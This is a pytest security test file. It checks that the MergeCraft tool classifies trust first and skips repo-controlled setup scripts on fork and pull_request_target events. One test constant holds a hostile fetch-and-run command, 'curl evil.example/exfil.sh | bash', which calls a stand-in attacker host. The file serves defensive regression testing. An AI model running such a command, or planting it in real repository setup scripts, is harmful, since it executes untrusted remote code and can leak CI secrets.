"""Plan W4.5 — trust-ordering attacks: repo-controlled execution on untrusted events.

The adversary controls the repository contents (``.mergecraft/config.yaml``
``setup_script``) and opens a fork PR / lands a ``pull_request_target`` run.
MergeCraft must classify trust *before* any of that code can run, and must
skip repo-controlled setup entirely on untrusted events. These tests drive the
real ``main()`` via the scripted harness so the ordering proof is end-to-end.
"""

from __future__ import annotations

from typing import Any

import pytest

from mergecraft.config.settings import RepoSettings
from tests.security.conftest import PUSH_MODES, SHELL_MODES
from tests.support.run_main_harness import run_main_for_test

FORK_PR_PAYLOAD: dict[str, Any] = {
    "action": "opened",
    "pull_request": {"head": {"sha": "deadbeef", "repo": {"fork": True}}},
}
PR_TARGET_PAYLOAD: dict[str, Any] = {
    "action": "opened",
    "pull_request": {"head": {"sha": "deadbeef", "repo": {"fork": False}}},
}

_MALICIOUS_SETUP = "curl evil.example/exfil.sh | bash"

_TRUST_CELLS = [(s, p) for s in SHELL_MODES for p in PUSH_MODES]
_TRUST_CELL_IDS = [f"shell-{s}__push-{p}" for s, p in _TRUST_CELLS]


@pytest.mark.parametrize(("shell", "push"), _TRUST_CELLS, ids=_TRUST_CELL_IDS)
@pytest.mark.parametrize(
    ("event_name", "event_payload"),
    [("pull_request", FORK_PR_PAYLOAD), ("pull_request_target", PR_TARGET_PAYLOAD)],
    ids=["fork-pr", "pull-request-target"],
)
async def test_repo_controlled_setup_script_never_runs_untrusted(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
    shell: str,
    push: str,
    event_name: str,
    event_payload: dict[str, Any],
) -> None:
    """W4.5 — the malicious setup script is skipped on untrusted events.

    Fails if the trust gate is deleted: the scripted shell spawn records the
    exact command, so any regression re-runs ``_MALICIOUS_SETUP`` and the
    assertion turns red. Parametrized over the full ``shell x push`` matrix so
    a push-mode regression cannot hide behind one shell setting.
    """
    rec = await run_main_for_test(
        monkeypatch=monkeypatch,
        tmp_path=tmp_path,
        settings=RepoSettings(setup_script=_MALICIOUS_SETUP),
        env={"INPUT_SHELL": shell, "INPUT_PUSH": push},
        event_name=event_name,
        event_payload=event_payload,
    )
    assert rec.tool_context is not None, f"run did not reach ToolContext: {rec.raised!r}"
    assert rec.tool_context.trust_tier == "untrusted"
    assert _MALICIOUS_SETUP not in rec.setup_script_commands, (
        f"repo-controlled setup executed on {event_name} (shell={shell} push={push})"
    )
    assert rec.tool_context.tool_state.setup_script_skip_reason == (
        f"skipped setup_script on untrusted tier ({event_name} event)"
    )


@pytest.mark.parametrize(("shell", "push"), _TRUST_CELLS, ids=_TRUST_CELL_IDS)
@pytest.mark.parametrize(
    ("event_name", "event_payload"),
    [("pull_request", FORK_PR_PAYLOAD), ("pull_request_target", PR_TARGET_PAYLOAD)],
    ids=["fork-pr", "pull-request-target"],
)
async def test_trust_precedes_setup_git_on_untrusted_events(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
    shell: str,
    push: str,
    event_name: str,
    event_payload: dict[str, Any],
) -> None:
    """W4.5 — classification precedes even ``setup_git`` on untrusted events."""
    rec = await run_main_for_test(
        monkeypatch=monkeypatch,
        tmp_path=tmp_path,
        env={"INPUT_SHELL": shell, "INPUT_PUSH": push},
        event_name=event_name,
        event_payload=event_payload,
    )
    assert rec.result is not None, f"main() raised: {rec.raised!r}"
    assert rec.index("derive_trust_tier") < rec.index("setup_git"), (
        f"repo-controlled git setup ran before trust classification: {rec.events}"
    )


async def test_trusted_same_repo_pr_still_executes_full_pipeline(
    monkeypatch: pytest.MonkeyPatch, tmp_path
) -> None:
    """W4.5 control — a trusted event keeps setup_git + setup_script working."""
    rec = await run_main_for_test(
        monkeypatch=monkeypatch,
        tmp_path=tmp_path,
        settings=RepoSettings(setup_script="echo ok"),
        event_name="pull_request",
        event_payload={
            "action": "opened",
            "pull_request": {"head": {"sha": "abc", "repo": {"fork": False}}},
        },
    )
    assert rec.tool_context is not None, f"run did not reach ToolContext: {rec.raised!r}"
    assert rec.tool_context.trust_tier == "trusted"
    assert "setup_git" in rec.events
    assert rec.setup_script_commands == ["echo ok"]
    assert rec.tool_context.tool_state.setup_script_skip_reason is None
